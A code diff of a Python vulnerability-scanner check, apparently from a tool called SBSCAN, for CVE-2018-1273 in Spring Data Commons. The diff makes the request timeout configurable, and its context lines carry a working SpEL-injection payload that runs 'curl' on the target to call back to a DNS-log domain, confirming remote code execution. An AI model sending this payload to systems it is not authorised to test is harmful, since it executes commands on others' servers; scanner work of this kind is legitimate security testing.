@@ -23,13 +23,14 @@ CVE_ID = "CVE-2018-1273"
 PAYLOAD = "username[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('curl SBSCAN_cve_2018_1273.%s')]=&password=&repeatedPassword="
 ENDPOINT = "/users?page=&size=5"
 
-def check(url, dns_domain, proxy=None, session=None):
+def check(url, dns_domain="", proxy=None, session=None, timeout=TIMEOUT):
     """
-    对给定的目标 URL 检测 CVE-2018-1273 漏洞
+    检测 CVE-2018-1273 漏洞
     :param url: 目标 URL
     :param dns_domain: DNS 日志域名
-    :param proxy: 代理配置（可选）
+    :param proxy: 代理配置
     :param session: 复用的 Session 实例（可选）
+    :param timeout: 请求超时时间（秒）
     :return: 如果存在漏洞，返回 (True, 详细信息字典)，否则返回 (False, {})
     """
     dns_domain = dns_domain or "dnslog.cn"  # 默认使用 dnslog.cn
@@ -55,7 +56,7 @@ def check(url, dns_domain, proxy=None, session=None):
     try:
         # 使用传入的 session，如果没有则创建新的 session（用于单独测试时）
         session = session or requests.Session()
-        res = session.post(target_url, headers=headers, timeout=TIMEOUT, data=payload, verify=False, proxies=proxy)
+        res = session.post(target_url, headers=headers, timeout=timeout, data=payload, verify=False, proxies=proxy)
 
         logger.debug(Fore.CYAN + f"[{res.status_code}]" + Fore.BLUE + f"[{res.headers}]", extra={"target": target_url})
 
